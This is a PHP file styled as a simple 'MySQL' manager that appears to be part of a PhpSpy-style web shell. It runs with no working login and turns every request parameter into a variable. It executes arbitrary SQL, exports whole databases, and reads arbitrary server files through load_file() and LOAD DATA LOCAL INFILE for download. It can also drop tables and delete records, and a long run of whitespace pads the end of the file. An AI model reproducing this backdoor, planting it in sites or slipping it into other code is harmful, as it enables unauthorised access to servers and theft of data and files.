<?php
error_reporting(7);
@set_magic_quotes_runtime(0);
ob_start();
$mtime = explode(' ', microtime());
$starttime = $mtime[1] + $mtime[0];
define('SA_ROOT', str_replace('\\', '/', dirname(__FILE__)).'/');
//define('IS_WIN', strstr(PHP_OS, 'WIN') ? 1 : 0 );
define('IS_WIN', DIRECTORY_SEPARATOR == '\\');
define('IS_COM', class_exists('COM') ? 1 : 0 );
define('IS_GPC', get_magic_quotes_gpc());
$dis_func = get_cfg_var('disable_functions');
define('IS_PHPINFO', (!eregi("phpinfo",$dis_func)) ? 1 : 0 );
@set_time_limit(0);

foreach(array('_GET','_POST') as $_request) {
foreach($$_request as $_key => $_value) {
if ($_key{0} != '_') {
if (IS_GPC) {
$_value = s_array($_value);
}
$$_key = $_value;
}
}
}

if ($charset == 'utf8') {
header("content-Type: text/html; charset=utf-8");
} elseif ($charset == 'big5') {
header("content-Type: text/html; charset=big5");
} elseif ($charset == 'gbk') {
header("content-Type: text/html; charset=gbk");
} elseif ($charset == 'latin1') {
header("content-Type: text/html; charset=iso-8859-2");
}

$self = $_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME'];
$timestamp = time();


if ($doing == 'backupmysql' && !$saveasfile) {
dbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
$table = array_flip($table);
$result = q("SHOW tables");
if (!$result) p('<h2>'.mysql_error().'</h2>');
$filename = basename($_SERVER['HTTP_HOST'].'_MySQL.sql');
header('Content-type: application/unknown');
header('Content-Disposition: attachment; filename='.$filename);
$mysqldata = '';
while ($currow = mysql_fetch_array($result)) {
if (isset($table[$currow[0]])) {
$mysqldata .= sqldumptable($currow[0]);
}
}
mysql_close();
exit;
}


if($doing=='mysqldown'){
if (!$dbname) {
$errmsg = 'Please input dbname';
} else {
dbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
if (!file_exists($mysqldlfile)) {
$errmsg = 'The file you want Downloadable was nonexistent';
} else {
$result = q("select load_file('$mysqldlfile');");
if(!$result){
q("DROP TABLE IF EXISTS tmp_angel;");
q("CREATE TABLE tmp_angel (content LONGBLOB NOT NULL);");
q("LOAD DATA LOCAL INFILE '".addslashes($mysqldlfile)."' INTO TABLE tmp_angel FIELDS TERMINATED BY '__angel_{$timestamp}_eof__' ESCAPED BY '' LINES TERMINATED BY '__angel_{$timestamp}_eof__';");
$result = q("select content from tmp_angel");
q("DROP TABLE tmp_angel");
}
$row = @mysql_fetch_array($result);
if (!$row) {
$errmsg = 'Load file failed '.mysql_error();
} else {
$fileinfo = pathinfo($mysqldlfile);
header('Content-type: application/x-'.$fileinfo['extension']);
header('Content-Disposition: attachment; filename='.$fileinfo['basename']);
header("Accept-Length: ".strlen($row[0]));
echo $row[0];
exit;
} } } }
?>

<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gbk">
<title>MySQL</title>
<style type="text/css">
body,td{font: 12px Arial,Tahoma;line-height: 16px;}
.input{font:12px Arial,Tahoma;background:#fff;border: 1px solid #666;padding:2px;height:22px;}
.area{font:12px 'Courier New', Monospace;background:#fff;border: 1px solid #666;padding:2px;}
.bt {border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;height:22px;}
a {color: #00f;text-decoration:underline;}
a:hover{color: #f00;text-decoration:none;}
.alt1 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f1f1f1;padding:5px 10px 5px 5px;}
.alt2 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f9f9f9;padding:5px 10px 5px 5px;}
.focus td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffffaa;padding:5px 10px 5px 5px;}
.head td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#e9e9e9;padding:5px 10px 5px 5px;font-weight:bold;}
.head td span{font-weight:normal;}
form{margin:0;padding:0;}
h2{margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}
ul.info li{margin:0;color:#444;line-height:24px;height:24px;}
u{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-right:10px;}
</style>
<script type="text/javascript">
function CheckAll(form) {
for(var i=0;i<form.elements.length;i++) {
var e = form.elements[i];
if (e.name != 'chkall')
e.checked = form.chkall.checked;
} }
function $(id) {
return document.getElementById(id);
}
function goaction(act){
$('goaction').action.value=act;
$('goaction').submit();
}
</script>
</head>
<body style="margin:0;table-layout:fixed; word-break:break-all">
<table width="100%" border="0" cellpadding="0" cellspacing="0">
<tr class="alt1">
<td><span style="float:right;">Safe Mode:<?php echo getcfg('safe_mode');?></span>
<a href="javascript:goaction('logout');">Logout</a> 
<a href="javascript:goaction('sqladmin');"></a> 
</td></tr></table>

<table width="100%" border="0" cellpadding="15" cellspacing="0"><tr><td>
<?php

formhead(array('name'=>'goaction'));
makehide('action');
formfoot();

if (!$action || $action == 'sqladmin') {
!$dbhost && $dbhost = 'localhost';
!$dbuser && $dbuser = '';
!$dbport && $dbport = '3306';
$dbform = '<input type="hidden" id="connect" name="connect" value="1" />';

if(isset($dbhost)){
$dbform .= "<input type=\"hidden\" id=\"dbhost\" name=\"dbhost\" value=\"$dbhost\" />\n";
} if(isset($dbuser)) {
$dbform .= "<input type=\"hidden\" id=\"dbuser\" name=\"dbuser\" value=\"$dbuser\" />\n";
} if(isset($dbpass)) {
$dbform .= "<input type=\"hidden\" id=\"dbpass\" name=\"dbpass\" value=\"$dbpass\" />\n";
} if(isset($dbport)) {
$dbform .= "<input type=\"hidden\" id=\"dbport\" name=\"dbport\" value=\"$dbport\" />\n";
} if(isset($dbname)) {
$dbform .= "<input type=\"hidden\" id=\"dbname\" name=\"dbname\" value=\"$dbname\" />\n";
} if(isset($charset)) {
$dbform .= "<input type=\"hidden\" id=\"charset\" name=\"charset\" value=\"$charset\" />\n";
}

	
if ($doing == 'backupmysql' && $saveasfile) {
if (!$table) {
m('Please choose the table');
} else {
dbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
$table = array_flip($table);
$fp = @fopen($path,'w');
if ($fp) {
$result = q('SHOW tables');
if (!$result) p('<h2>'.mysql_error().'</h2>');
$mysqldata = '';
while ($currow = mysql_fetch_array($result)) {
if (isset($table[$currow[0]])) {
sqldumptable($currow[0], $fp);
}
}
fclose($fp);
$fileurl = str_replace(SA_ROOT,'',$path);
m('Database has success backup to <a href="'.$fileurl.'" target="_blank">'.$path.'</a>');
mysql_close();
} else {
m('Backup failed');
}
}
}
if ($insert && $insertsql) {
$keystr = $valstr = $tmp = '';
foreach($insertsql as $key => $val) {
if ($val) {
$keystr .= $tmp.$key;
$valstr .= $tmp."'".addslashes($val)."'";
$tmp = ',';
}
}
if ($keystr && $valstr) {
dbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
m(q("INSERT INTO $tablename ($keystr) VALUES ($valstr)") ? 'Insert new record of success' : mysql_error());
}
}
if ($update && $insertsql && $base64) {
$valstr = $tmp = '';
foreach($insertsql as $key => $val) {
$valstr .= $tmp.$key."='".addslashes($val)."'";
$tmp = ',';
}
if ($valstr) {
$where = base64_decode($base64);
dbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
m(q("UPDATE $tablename SET $valstr WHERE $where LIMIT 1") ? 'Record updating' : mysql_error());
}
}
if ($doing == 'del' && $base64) {
$where = base64_decode($base64);
$delete_sql = "DELETE FROM $tablename WHERE $where";
dbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
m(q("DELETE FROM $tablename WHERE $where") ? 'Deletion record of success' : mysql_error());
}

if ($tablename && $doing == 'drop') {
dbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
if (q("DROP TABLE $tablename")) {
m('Drop table of success');
$tablename = '';
} else {
m(mysql_error());
}
}

$charsets = array(''=>'Default','gbk'=>'GBK', 'big5'=>'Big5', 'utf8'=>'UTF-8', 'latin1'=>'Latin1');

formhead(array('title'=>'MYSQL Manager'));
makehide('action','sqladmin');
p('<center><p>');
p('DB Host :');
makeinput(array('name'=>'dbhost','size'=>20,'value'=>$dbhost));
p('<p>');
p('DB User :');
makeinput(array('name'=>'dbuser','size'=>20,'value'=>$dbuser));
p('<p>');
p('DB Pass :');
makeinput(array('name'=>'dbpass','size'=>20,'value'=>$dbpass));
p('<p>');
makeinput(array('name'=>'connect','value'=>'Connect','type'=>'submit','class'=>'bt'));
p('</p></center>');
formfoot();
?>
<script type="text/javascript">
function editrecord(action, base64, tablename){
if (action == 'del') {
if (!confirm('Is or isn\'t deletion record?')) return;
}
$('recordlist').doing.value=action;
$('recordlist').base64.value=base64;
$('recordlist').tablename.value=tablename;
$('recordlist').submit();
}
function moddbname(dbname) {
if(!dbname) return;
$('setdbname').dbname.value=dbname;
$('setdbname').submit();
}
function settable(tablename,doing,page) {
if(!tablename) return;
if (doing) {
$('settable').doing.value=doing;
}
if (page) {
$('settable').page.value=page;
}
$('settable').tablename.value=tablename;
$('settable').submit();
}
</script>
<?php

formhead(array('name'=>'recordlist'));
makehide('doing');
makehide('action','sqladmin');
makehide('base64');
makehide('tablename');
p($dbform);
formfoot();


formhead(array('name'=>'setdbname'));
makehide('action','sqladmin');
p($dbform);
if (!$dbname) {
makehide('dbname');
}
formfoot();


formhead(array('name'=>'settable'));
makehide('action','sqladmin');
p($dbform);
makehide('tablename');
makehide('page',$page);
makehide('doing');
formfoot();

$cachetables = array();
$pagenum = 30;
$page = intval($page);
if($page) {
$start_limit = ($page - 1) * $pagenum;
} else {
$start_limit = 0;
$page = 1;
}
if (isset($dbhost) && isset($dbuser) && isset($dbpass) && isset($connect)) {
dbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
$mysqlver = mysql_get_server_info();
p('<p>MySQL '.$mysqlver.' running in '.$dbhost.' as '.$dbuser.'@'.$dbhost.'</p>');
$highver = $mysqlver > '4.1' ? 1 : 0;

$query = q("SHOW DATABASES");
$dbs = array();
$dbs[] = '-- Select a database --';
while($db = mysql_fetch_array($query)) {
$dbs[$db['Database']] = $db['Database'];
}
makeselect(array('title'=>'Please select a database:','name'=>'db[]','option'=>$dbs,'selected'=>$dbname,'onchange'=>'moddbname(this.options[this.selectedIndex].value)','newline'=>1));
$tabledb = array();
if ($dbname) {
p('<p>');
p('Current dababase: <a href="javascript:moddbname(\''.$dbname.'\');">'.$dbname.'</a>');
if ($tablename) {
p(' | Current Table: <a href="javascript:settable(\''.$tablename.'\');">'.$tablename.'</a> [ <a href="javascript:settable(\''.$tablename.'\', \'insert\');">Insert</a> | <a href="javascript:settable(\''.$tablename.'\', \'structure\');">Data</a> | <a href="javascript:settable(\''.$tablename.'\', \'drop\');">Drop</a> ]');
}
p('</p>');
mysql_select_db($dbname);

$getnumsql = '';
$runquery = 0;
if ($sql_query) {
$runquery = 1;
}
$allowedit = 0;
if ($tablename && !$sql_query) {
$sql_query = "SELECT * FROM $tablename";
$getnumsql = $sql_query;
$sql_query = $sql_query." LIMIT $start_limit, $pagenum";
$allowedit = 1;
}
p('<form action="'.$self.'" method="POST">');
p('<p><table width="200" border="0" cellpadding="0" cellspacing="0"><tr><td colspan="2">Run SQL query/queries on database '.$dbname.':</td></tr><tr><td><textarea name="sql_query" class="area" style="width:600px;height:50px;overflow:auto;">'.htmlspecialchars($sql_query,ENT_QUOTES).'</textarea></td><td style="padding:0 5px;"><input class="bt" style="height:50px;" name="submit" type="submit" value="Query" /></td></tr></table></p>');
makehide('tablename', $tablename);
makehide('action','sqladmin');
p($dbform);
p('</form>');
if ($tablename || ($runquery && $sql_query)) {
if ($doing == 'structure') {
$result = q("SHOW COLUMNS FROM $tablename");
$rowdb = array();
while($row = mysql_fetch_array($result)) {
$rowdb[] = $row;
}
p('<table border="0" cellpadding="3" cellspacing="0">');
p('<tr class="head">');
p('<td>Field</td>');
p('<td>Type</td>');
p('<td>Null</td>');
p('<td>Key</td>');
p('<td>Default</td>');
p('<td>Extra</td>');
p('</tr>');
foreach ($rowdb as $row) {
$thisbg = bg();
p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
p('<td>'.$row['Field'].'</td>');
p('<td>'.$row['Type'].'</td>');
p('<td>'.$row['Null'].'&nbsp;</td>');
p('<td>'.$row['Key'].'&nbsp;</td>');
p('<td>'.$row['Default'].'&nbsp;</td>');
p('<td>'.$row['Extra'].'&nbsp;</td>');
p('</tr>');
}
tbfoot();
} elseif ($doing == 'insert' || $doing == 'edit') {
$result = q('SHOW COLUMNS FROM '.$tablename);
while ($row = mysql_fetch_array($result)) {
$rowdb[] = $row;
}
$rs = array();
if ($doing == 'insert') {
p('<h2>Insert new line in '.$tablename.' table &raquo;</h2>');
} else {
p('<h2>Update record in '.$tablename.' table &raquo;</h2>');
$where = base64_decode($base64);
$result = q("SELECT * FROM $tablename WHERE $where LIMIT 1");
$rs = mysql_fetch_array($result);
}
p('<form method="post" action="'.$self.'">');
p($dbform);
makehide('action','sqladmin');
makehide('tablename',$tablename);
p('<table border="0" cellpadding="3" cellspacing="0">');
foreach ($rowdb as $row) {
if ($rs[$row['Field']]) {
$value = htmlspecialchars($rs[$row['Field']]);
} else {
$value = '';
}
$thisbg = bg();
p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
p('<td><b>'.$row['Field'].'</b><br />'.$row['Type'].'</td><td><textarea class="area" name="insertsql['.$row['Field'].']" style="width:500px;height:60px;overflow:auto;">'.$value.'</textarea></td></tr>');
}
if ($doing == 'insert') {
p('<tr class="'.bg().'"><td colspan="2"><input class="bt" type="submit" name="insert" value="Insert" /></td></tr>');
} else {
p('<tr class="'.bg().'"><td colspan="2"><input class="bt" type="submit" name="update" value="Update" /></td></tr>');
makehide('base64', $base64);
}
p('</table></form>');
} else {
$querys = @explode(';',$sql_query);
foreach($querys as $num=>$query) {
if ($query) {
p("<p><b>Query#{$num} : ".htmlspecialchars($query,ENT_QUOTES)."</b></p>");
switch(qy($query))
{
case 0:
p('<h2>Error : '.mysql_error().'</h2>');
break;
case 1:
if (strtolower(substr($query,0,13)) == 'select * from') {
$allowedit = 1;
}
if ($getnumsql) {
$tatol = mysql_num_rows(q($getnumsql));
$multipage = multi($tatol, $pagenum, $page, $tablename);
}
if (!$tablename) {
$sql_line = str_replace(array("\r", "\n", "\t"), array(' ', ' ', ' '), trim(htmlspecialchars($query)));
$sql_line = preg_replace("/\/\*[^(\*\/)]*\*\//i", " ", $sql_line);
preg_match_all("/from\s+`{0,1}([\w]+)`{0,1}\s+/i",$sql_line,$matches);
$tablename = $matches[1][0];
}
$result = q($query);
p($multipage);
p('<table border="0" cellpadding="3" cellspacing="0">');
p('<tr class="head">');
if ($allowedit) p('<td>Action</td>');
$fieldnum = @mysql_num_fields($result);
for($i=0;$i<$fieldnum;$i++){
$name = @mysql_field_name($result, $i);
$type = @mysql_field_type($result, $i);
$len = @mysql_field_len($result, $i);
p("<td nowrap>$name<br><span>$type($len)</span></td>");
}
p('</tr>');
while($mn = @mysql_fetch_assoc($result)){
$thisbg = bg();
p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
$where = $tmp = $b1 = '';
foreach($mn as $key=>$inside){
if ($inside) {
$where .= $tmp.$key."='".addslashes($inside)."'";
$tmp = ' AND ';
}
$b1 .= '<td nowrap>'.html_clean($inside).'&nbsp;</td>';
}
$where = base64_encode($where);
if ($allowedit) p('<td nowrap><a href="javascript:editrecord(\'edit\', \''.$where.'\', \''.$tablename.'\');">Edit</a> | <a href="javascript:editrecord(\'del\', \''.$where.'\', \''.$tablename.'\');">Del</a></td>');
p($b1);
p('</tr>');
unset($b1);
}
tbfoot();
p($multipage);
break;
case 2:
$ar = mysql_affected_rows();
p('<h2>affected rows : <b>'.$ar.'</b></h2>');
break;
}
}
}
}
} else {
$query = q("SHOW TABLE STATUS");
$table_num = $table_rows = $data_size = 0;
$tabledb = array();
while($table = mysql_fetch_array($query)) {
$data_size = $data_size + $table['Data_length'];
$table_rows = $table_rows + $table['Rows'];
$table['Data_length'] = sizecount($table['Data_length']);
$table_num++;
$tabledb[] = $table;
}
$data_size = sizecount($data_size);
unset($table);
p('<table border="0" cellpadding="0" cellspacing="0">');
p('<form action="'.$self.'" method="POST">');
makehide('action','sqladmin');
p($dbform);
p('<tr class="head">');
p('<td width="2%" align="center"><input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /></td>');
p('<td>Name</td>');
p('<td>Rows</td>');
p('<td>Data_length</td>');
p('<td>Create_time</td>');
p('<td>Update_time</td>');
if ($highver) {
p('<td>Engine</td>');
p('<td>Collation</td>');
}
p('</tr>');
foreach ($tabledb as $key => $table) {
$thisbg = bg();
p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
p('<td align="center" width="2%"><input type="checkbox" name="table[]" value="'.$table['Name'].'" /></td>');
p('<td><a href="javascript:settable(\''.$table['Name'].'\');">'.$table['Name'].'</a> [ <a href="javascript:settable(\''.$table['Name'].'\', \'insert\');">Insert</a> | <a href="javascript:settable(\''.$table['Name'].'\', \'structure\');">Structure</a> | <a href="javascript:settable(\''.$table['Name'].'\', \'drop\');">Drop</a> ]</td>');
p('<td>'.$table['Rows'].'</td>');
p('<td>'.$table['Data_length'].'</td>');
p('<td>'.$table['Create_time'].'</td>');
p('<td>'.$table['Update_time'].'</td>');
if ($highver) {
p('<td>'.$table['Engine'].'</td>');
p('<td>'.$table['Collation'].'</td>');
}
p('</tr>');
}
p('<tr class='.bg().'>');
p('<td>&nbsp;</td>');
p('<td>Total tables: '.$table_num.'</td>');
p('<td>'.$table_rows.'</td>');
p('<td>'.$data_size.'</td>');
p('<td colspan="'.($highver ? 4 : 2).'">&nbsp;</td>');
p('</tr>');
p("<tr class=\"".bg()."\"><td colspan=\"".($highver ? 8 : 6)."\"><input name=\"saveasfile\" value=\"1\" type=\"checkbox\" /> Save as file <input class=\"input\" name=\"path\" value=\"".SA_ROOT.$_SERVER['HTTP_HOST']."_MySQL.sql\" type=\"text\" size=\"60\" /> <input class=\"bt\" type=\"submit\" name=\"downrar\" value=\"Export selection table\" /></td></tr>");
makehide('doing','backupmysql');
formfoot();
p("</table>");
fr($query);
}
}
}
tbfoot();
@mysql_close();
}		
?>
</td></tr></table>
</body>
</html>

<?php

function m($msg) {
echo '<div style="background:#f1f1f1;border:1px solid #ddd;padding:15px;font:14px;text-align:center;font-weight:bold;">';
echo $msg;
echo '</div>';
}
function scookie($key, $value, $life = 0, $prefix = 1) {
global $admin, $timestamp, $_SERVER;
$key = ($prefix ? $admin['cookiepre'] : '').$key;
$life = $life ? $life : $admin['cookielife'];
$useport = $_SERVER['SERVER_PORT'] == 443 ? 1 : 0;
setcookie($key, $value, $timestamp+$life, $admin['cookiepath'], $admin['cookiedomain'], $useport);
}
function multi($num, $perpage, $curpage, $tablename) {
$multipage = '';
if($num > $perpage) {
$page = 10;
$offset = 5;
$pages = @ceil($num / $perpage);
if($page > $pages) {
$from = 1;
$to = $pages;
} else {
$from = $curpage - $offset;
$to = $curpage + $page - $offset - 1;
if($from < 1) {
$to = $curpage + 1 - $from;
$from = 1;
if(($to - $from) < $page && ($to - $from) < $pages) {
$to = $page;
}
} elseif($to > $pages) {
$from = $curpage - $pages + $to;
$to = $pages;
if(($to - $from) < $page && ($to - $from) < $pages) {
$from = $pages - $page + 1;
}
}
}
$multipage = ($curpage - $offset > 1 && $pages > $page ? '<a href="javascript:settable(\''.$tablename.'\', \'\', 1);">First</a> ' : '').($curpage > 1 ? '<a href="javascript:settable(\''.$tablename.'\', \'\', '.($curpage - 1).');">Prev</a> ' : '');
for($i = $from; $i <= $to; $i++) {
$multipage .= $i == $curpage ? $i.' ' : '<a href="javascript:settable(\''.$tablename.'\', \'\', '.$i.');">['.$i.']</a> ';
}
$multipage .= ($curpage < $pages ? '<a href="javascript:settable(\''.$tablename.'\', \'\', '.($curpage + 1).');">Next</a>' : '').($to < $pages ? ' <a href="javascript:settable(\''.$tablename.'\', \'\', '.$pages.');">Last</a>' : '');
$multipage = $multipage ? '<p>Pages: '.$multipage.'</p>' : '';
}
return $multipage;
}
function loginpage() {
?>
<style type="text/css">
input {font:11px Verdana;BACKGROUND: #FFFFFF;height: 18px;border: 1px solid #666666;}
</style>
<form method="POST" action="">
<span style="font:11px Verdana;">Password: </span><input name="password" type="password" size="20">
<input type="hidden" name="doing" value="login">
<input type="submit" value="Login">
</form>
<?php
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
?>
